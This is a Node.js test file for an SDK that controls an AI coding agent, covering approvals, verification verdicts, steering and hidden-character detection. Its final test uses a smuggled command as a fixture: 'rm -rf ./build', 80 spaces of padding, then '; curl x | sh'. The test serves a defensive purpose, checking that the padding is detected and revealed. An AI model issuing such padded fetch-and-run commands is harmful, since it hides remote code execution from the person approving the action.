import assert from "node:assert/strict";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";

import { readFileSync } from "node:fs";

import { Abhed, AbhedError, Decision, ProcessExited, RunError, argsHidden, hasHidden, visible } from "../dist/index.js";

const STUB = join(dirname(fileURLToPath(import.meta.url)), "stub-rpc.mjs");
const stub = (opts = {}) => Abhed.spawn({ binary: process.execPath, args: [STUB], ...opts });

test("prompt returns the answer and its verdict, events in order", async () => {
  const seen = [];
  const ab = stub();
  const s = await ab.start({ onEvent: (e) => seen.push(e) });
  assert.equal(s.workspaceTrust.trusted, false);
  const a = await s.prompt("hello");
  assert.equal(a.text, "hi");
  assert.equal(a.verdict.outcome, "verified");
  assert.equal(s.sessionId, "s-stub");
  assert.deepEqual(seen.map((e) => e.type), ["user.message", "agent.message", "answer.verdict"]);
  assert.deepEqual(seen.map((e) => e.seq), [1, 2, 3]);
  assert.equal(await ab.close(), 0);
});

test("start options reach the engine", async () => {
  const ab = stub();
  const runbook = { plan: "p", runbook: [{ tool: "bash", args: { command: "make" } }], sha256: "ab" };
  const s = await ab.start({ workspace: "/w", mode: "plan", allow: ["bash(go test*)"], deny: ["web_fetch"], verify: "strict", wake: "notify", runbook, approvals: true });
  const got = JSON.parse((await s.prompt("echo-start")).text);
  assert.equal(got.method, "start");
  assert.equal(got.workspace, "/w");
  assert.equal(got.mode, "plan");
  assert.deepEqual(got.allow, ["bash(go test*)"]);
  assert.deepEqual(got.deny, ["web_fetch"]);
  assert.equal(got.verify, "strict");
  assert.equal(got.wake, "notify");
  assert.deepEqual(got.runbook, runbook);
  assert.equal(got.approvals, true);
  await ab.close();
});

test("no approvals unless asked", async () => {
  const ab = stub();
  const got = JSON.parse((await (await ab.start()).prompt("echo-start")).text);
  assert.equal("approvals" in got, false);
  assert.equal((await (await ab.start()).prompt("approve-me")).text, "refused");
  await ab.close();
});

test("an approval handler answers, async included", async () => {
  const asked = [];
  const ab = stub();
  const s = await ab.start({
    onApproval: async (req) => {
      asked.push(req);
      return Decision.allowOnce("olga@example.com");
    },
  });
  assert.equal((await s.prompt("approve-me")).text, "allowed by olga@example.com");
  assert.equal(asked.length, 1);
  const r = asked[0];
  assert.equal(r.request_id, "r-1");
  assert.equal(r.tool, "bash");
  assert.equal(r.destructive, true);
  assert.equal(r.args_hidden, true);
  assert.equal(argsHidden(r.args), true);
  assert.match(visible(r.args.command), /⟨U\+202E⟩/);
  await ab.close();
});

test("a handler that throws refuses the call", async () => {
  const notes = [];
  const ab = stub({ onError: (m) => notes.push(m) });
  const s = await ab.start({
    onApproval: () => {
      throw new Error("no");
    },
  });
  assert.equal((await s.prompt("approve-me")).text, "denied remember=false");
  assert.ok(notes.some((n) => n.includes("onApproval threw")));
  await ab.close();
});

test("stream yields events, approvals and the answer", async () => {
  const ab = stub();
  const s = await ab.start({ approvals: true });
  const items = [];
  for await (const item of s.stream("approve-me")) {
    items.push(item);
    if (item.kind === "approval") await s.approve(item.approval.request_id, Decision.allowAlways());
  }
  const last = items.at(-1);
  assert.equal(last.kind, "answer");
  assert.equal(last.answer.text, "allowed by ");
  const kinds = items.filter((i) => i.kind === "event").map((i) => i.event.type);
  assert.deepEqual(kinds.slice(0, 2), ["user.message", "action.requested"]);
  assert.ok(kinds.includes("action.approved"));
  assert.ok(items.some((i) => i.kind === "approval"));
  await ab.close();
});

test("approve for an ask not waiting is an error", async () => {
  const ab = stub();
  const s = await ab.start();
  await assert.rejects(s.approve("r-404", Decision.deny()), (e) => e instanceof RunError && /no approval is waiting/.test(e.message));
  await ab.close();
});

test("strict and unverified is a RunError with the verdict", async () => {
  const ab = stub();
  const s = await ab.start({ verify: "strict" });
  await assert.rejects(s.prompt("strict"), (e) => {
    assert.ok(e instanceof RunError);
    assert.equal(e.unverified, true);
    assert.equal(e.reason, "unverified");
    assert.equal(e.detail, "1 statement about the work is unverified");
    assert.equal(e.answer, "the tests pass");
    assert.equal(e.verdict.outcome, "unverified");
    assert.equal(e.verdict.claims[0].reason, "no test run in the record");
    return true;
  });
  await ab.close();
});

test("a steer reaches the running prompt", async () => {
  const ab = stub();
  const s = await ab.start();
  const running = s.prompt("steer-me");
  assert.equal(await s.steer("look at auth too"), "steered");
  assert.equal((await running).text, "steered: look at auth too");
  assert.equal(await s.steer("later"), "queued");
  await ab.close();
});

test("usage, export, tasks, providers, wake", async () => {
  const ab = stub();
  assert.deepEqual(await ab.providers(), ["anthropic", "openai-compatible"]);
  const s = await ab.start();
  const u = await s.usage();
  assert.equal(u.InputTokens, 120);
  assert.equal(u.Turns, 2);
  assert.match(await s.exportHtml(), /<title>s-stub<\/title>/);
  const t = await s.tasks();
  assert.equal(t[0].task_id, "t1");
  await s.cancelTask("t1");
  await assert.rejects(s.cancelTask("t9"), RunError);
  await assert.rejects(s.wake(), RunError);
  await ab.close();
});

test("woken lines and error lines no request owns", async () => {
  const notes = [];
  const ab = stub({ onError: (m) => notes.push(m) });
  let woke;
  const woken = new Promise((r) => (woke = r));
  const s = await ab.start({ onWoken: woke });
  assert.equal((await s.prompt("wake-later")).text, "started");
  assert.equal((await woken).answer, "background done");
  assert.equal((await s.prompt("stray-error")).text, "ok");
  assert.ok(notes.some((n) => n.includes("not delivered")));
  await ab.close();
});

test("a failed start, and a session a later start replaced", async () => {
  const ab = stub();
  await assert.rejects(ab.start({ workspace: "/nope" }), /does not exist/);
  const first = await ab.start();
  await ab.start();
  await assert.rejects(first.prompt("hello"), AbhedError);
  await ab.close();
});

test("the process dying fails the request with its code and stderr", async () => {
  const ab = stub();
  const s = await ab.start();
  await assert.rejects(s.prompt("die"), (e) => e instanceof ProcessExited && e.code === 3);
  assert.match(ab.stderr, /boom/);
  await assert.rejects(s.prompt("hello"), ProcessExited);
  assert.equal(await ab.close(), 3);
});

test("a line over 8 MiB", async () => {
  const ab = stub();
  assert.equal((await (await ab.start()).prompt("big")).text.length, 9 << 20);
  await ab.close();
});

test("a missing binary", async () => {
  const ab = Abhed.spawn({ binary: "/nonexistent/abhed" });
  await assert.rejects(ab.providers(), ProcessExited);
  await ab.close();
});

// The port against the engine's own answers (internal/ui TestSDKVisibleCases).
const CASES = JSON.parse(readFileSync(join(dirname(fileURLToPath(import.meta.url)), "..", "..", "testdata", "visible.json"), "utf8"));

test("visible matches the engine", () => {
  for (const c of CASES.visible) {
    assert.equal(visible(c.in), c.visible, JSON.stringify(c.in));
    assert.equal(visible(c.in, { oneLine: true }), c.line, JSON.stringify(c.in));
    assert.equal(hasHidden(c.in), c.hidden, JSON.stringify(c.in));
  }
});

test("argsHidden matches the engine", () => {
  for (const c of CASES.args) assert.equal(argsHidden(c.args), c.hidden, JSON.stringify(c.args));
  const pad = "rm -rf ./build" + " ".repeat(80) + "; curl x | sh";
  assert.equal(argsHidden({ command: pad }), true);
  assert.match(visible(pad), /⟨80 spaces⟩/);
});
